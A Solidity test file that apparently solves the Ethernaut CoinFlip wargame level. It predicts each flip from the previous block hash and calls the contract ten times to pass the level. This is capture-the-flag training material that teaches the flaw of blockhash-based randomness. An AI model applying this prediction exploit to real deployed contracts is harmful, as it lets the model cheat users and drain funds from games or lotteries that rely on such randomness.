pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/3_CoinFlip/CoinFlipFactory.sol";
import "../../src/3_CoinFlip/CoinFlip.sol";
import "../../src/Ethernaut.sol";
import ".././utils/vm.sol";

contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();

        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory probFactory = new CoinFlipFactory();
        ethernaut.registerLevel(probFactory);
        vm.startPrank(eoaAddress);

        address levelAddress = ethernaut.createLevelInstance(probFactory);
        CoinFlip probCtrt = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue;
        uint256 coinFlip;
        bool side;

        for (uint256 i = 0; i < 10; i++) {
            vm.roll(10 + i * 10);

            blockValue = uint256(blockhash(block.number - 1));
            coinFlip = blockValue / (FACTOR);
            side = coinFlip == 1 ? true : false;

            emit log_named_uint("blockValue: ", blockValue);
            emit log_named_uint("blockTimestamp: ", block.timestamp);
            emit log_named_uint("blockDifficulty: ", block.difficulty);
            emit log_named_uint("..: ", 0);

            probCtrt.flip(side);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
